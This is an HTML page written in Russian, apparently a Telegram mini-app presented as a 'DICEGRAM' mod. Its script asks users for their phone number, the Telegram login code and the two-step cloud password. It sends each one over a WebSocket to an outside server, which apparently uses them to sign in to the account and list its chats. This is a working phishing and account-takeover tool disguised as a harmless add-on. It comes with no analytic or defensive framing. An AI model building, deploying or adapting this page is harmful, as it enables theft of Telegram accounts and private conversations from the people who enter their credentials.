<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DICEGRAM Мод</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #0e1621;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .app-container {
            background: #17212b;
            width: 100%;
            max-width: 400px;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .screen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
            padding: 20px;
            text-align: center;
        }
        .hidden { display: none !important; }
        h2 { color: #5288c1; margin-bottom: 10px; }
        p { color: #7f91a4; margin-bottom: 20px; font-size: 14px; }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border: 1px solid #243143;
            border-radius: 8px;
            background: #242f3d;
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #5288c1;
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        
        /* Сетка оригинальных чатов */
        #messenger-screen { justify-content: flex-start; padding: 0; }
        .header {
            width: 100%;
            background: #242f3d;
            padding: 15px;
            font-weight: bold;
            font-size: 18px;
            border-bottom: 1px solid #101921;
        }
        .chats-list {
            width: 100%;
            overflow-y: auto;
            flex: 1;
        }
        .chat-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            border-bottom: 1px solid #101921;
            cursor: pointer;
        }
        .chat-item:hover { background: #202b36; }
        .chat-name { font-weight: 500; }
        .chat-unread {
            background: #5288c1;
            color: #fff;
            font-size: 12px;
            padding: 3px 8px;
            border-radius: 10px;
        }
        #server-status { padding: 8px; font-size: 12px; background: #242f3d; width: 100%; text-align: center;}
    </style>
</head>
<body>

<div class="app-container">
    <div id="server-status" style="color: #e6a23c;">Подключение к серверам DICEGRAM...</div>

    <div id="phone-screen" class="screen hidden">
        <h2>DICEGRAM</h2>
        <p>Введите ваш реальный номер телефона для входа в Telegram</p>
        <input type="tel" id="phone-input" placeholder="+77071234567">
        <button onclick="sendPhone()">Получить код от Telegram</button>
    </div>

    <div id="code-screen" class="screen hidden">
        <h2>Введите код</h2>
        <p>Введите официальный код подтверждения, пришедший от службы Telegram</p>
        <input type="text" id="code-input" placeholder="Код подтверждения">
        <button onclick="sendCode()">Войти</button>
    </div>

    <div id="password-screen" class="screen hidden">
        <h2>Облачный пароль</h2>
        <p>Введите ваш пароль двухшаговой аутентификации</p>
        <input type="password" id="password-input" placeholder="Пароль">
        <button onclick="sendPassword()">Подтвердить</button>
    </div>

    <div id="messenger-screen" class="screen hidden">
        <div class="header" id="user-header">Чаты Telegram</div>
        <div class="chats-list" id="chats-container"></div>
    </div>
</div>

<script>
    const socket = new WebSocket('wss://a38499-be46.m.jrnm.app');
    const statusBox = document.getElementById('server-status');

    socket.onopen = () => {
        statusBox.innerText = 'DICEGRAM Мод подключен к API';
        statusBox.style.color = '#4caf50';
        document.getElementById('phone-screen').classList.remove('hidden');
    };

    socket.onclose = () => {
        statusBox.innerText = 'Ошибка: сервер мода отключен';
        statusBox.style.color = '#f56c6c';
        hideAllScreens();
    };

    socket.onmessage = (event) => {
        const data = JSON.parse(event.data);
        
        if (data.status === 'code_sent') {
            hideAllScreens();
            document.getElementById('code-screen').classList.remove('hidden');
        } 
        else if (data.status === 'password_needed') {
            hideAllScreens();
            document.getElementById('password-screen').classList.remove('hidden');
        }
        else if (data.status === 'success') {
            hideAllScreens();
            document.getElementById('messenger-screen').classList.remove('hidden');
            renderChats(data.dialogs);
        } 
        else if (data.status === 'error') {
            alert(data.message);
        }
    };

    function sendPhone() {
        const phone = document.getElementById('phone-input').value;
        if (!phone) return alert('Введите номер телефона!');
        socket.send(JSON.stringify({ action: 'send_phone', phone: phone }));
    }

    function sendCode() {
        const code = document.getElementById('code-input').value;
        if (!code) return alert('Введите код!');
        socket.send(JSON.stringify({ action: 'send_code', code: code }));
    }

    function sendPassword() {
        const pwd = document.getElementById('password-input').value;
        if (!pwd) return alert('Введите пароль!');
        socket.send(JSON.stringify({ action: 'send_password', password: pwd }));
    }

    function renderChats(chats) {
        const container = document.getElementById('chats-container');
        container.innerHTML = '';
        
        if(chats.length === 0) {
            container.innerHTML = '<p style="padding:20px;">Нет активных чатов</p>';
            return;
        }

        chats.forEach(chat => {
            const item = document.createElement('div');
            item.className = 'chat-item';
            let unreadBadge = chat.unread > 0 ? `<span class="chat-unread">${chat.unread}</span>` : '';
            item.innerHTML = `
                <div class="chat-name">${chat.name}</div>
                ${unreadBadge}
            `;
            container.appendChild(item);
        });
    }

    function hideAllScreens() {
        document.getElementById('phone-screen').classList.add('hidden');
        document.getElementById('code-screen').classList.add('hidden');
        document.getElementById('password-screen').classList.add('hidden');
        document.getElementById('messenger-screen').classList.add('hidden');
    }
</script>

</body>
</html>
